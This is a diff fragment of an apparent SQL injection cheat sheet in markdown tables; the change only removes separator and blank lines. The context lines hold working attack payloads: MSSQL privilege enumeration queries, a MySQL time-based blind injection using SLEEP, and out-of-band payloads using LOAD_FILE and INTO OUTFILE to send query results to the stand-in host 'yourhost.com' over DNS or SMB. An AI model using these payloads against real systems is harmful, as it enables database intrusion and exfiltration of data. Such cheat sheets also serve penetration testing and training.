@@ -197,7 +197,6 @@ Current privs on a particular object in 2005, 2008 | SELECT permission_name FROM
 . | - This command obtains column name ‘name’ from table master..syslogins having dbcreator value as 1.
 . | SELECT name FROM master..syslogins WHERE bulkadmin = 1;
 . | - This command obtains column name ‘name’ from table master..syslogins having bulkadmin value as 1.
-------| ------
 
 # MYSQL
 
@@ -300,7 +299,6 @@ injection and silent attacks. Blind SQL Injection (Time Based) | .
 Time base SQLi exploitation | ?vulnerableParam=-99 OR IF((ASCII(MID(({INJECTON}),1,1)) = 100),SLEEP(14),1) = 0 LIMIT 1— 
 . |  {INJECTION} = You want to run the query.
 . | - If the condition is true, will response after 14 seconds. If is false, will be delayed for one second.
-
 Out of Band Channel | ?vulnerableParam=-99 OR (SELECT LOAD_FILE(concat('\\\\',({INJECTION}), 'yourhost.com\\')));
 . | - This command makes a NBNS query request/DNS resolution request to yourhost.com.
 . | ?vulnerableParam=-99 OR (SELECT ({INJECTION}) INTO OUTFILE '\\\\yourhost.com\\share\\output.txt');
@@ -319,7 +317,6 @@ privileges | .
 . | - This command lists privileges on databases (schemas).
 . | SELECT table_schema, table_name, column_name, privilege_type FROM information_schema.column_privileges;
 . | - This command lists privileges on columns.
-------| ------
 
 # POSTGRESSQL
 
